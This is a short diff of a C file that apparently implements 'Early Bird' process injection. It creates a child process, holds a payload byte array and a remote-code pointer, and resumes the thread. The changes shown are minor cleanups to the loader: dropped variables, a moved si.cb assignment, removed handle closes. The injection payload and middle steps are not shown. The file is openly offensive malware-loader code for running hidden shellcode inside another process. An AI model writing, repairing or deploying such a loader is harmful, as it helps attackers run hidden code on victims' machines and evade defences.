@@ -41,16 +41,14 @@ unsigned char payload[] =
 size_t payload_len = sizeof(payload);
 
 int inject_earlybird() {
-    int pid = 0;
     DWORD bWritten = 0;
-    HANDLE hProc = NULL;
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     void * pRemoteCode;
     
     ZeroMemory( &si, sizeof(si) );
-    si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );
+    si.cb = sizeof(si);
 
     BOOL bResult = CreateProcessA(
         0,
@@ -64,9 +62,7 @@ int inject_earlybird() {
         &si, 
         &pi
     );
-    CloseHandle(si.hStdInput);
-    CloseHandle(si.hStdError);
-    CloseHandle(si.hStdOutput);
+
     if (!bResult) {
         fprintf(stderr, "[!] CreateProcessA() failed! (0x%x)\n", GetLastError());
         return -1;
@@ -118,7 +114,7 @@ int inject_earlybird() {
         CloseHandle(pi.hThread);
         return -1;
     }
-    
+
     dResult = ResumeThread(pi.hThread);
     if (dResult == (DWORD)-1) {
         fprintf(stderr, "[!] ResumeThread() failed! (0x%x)\n", GetLastError());
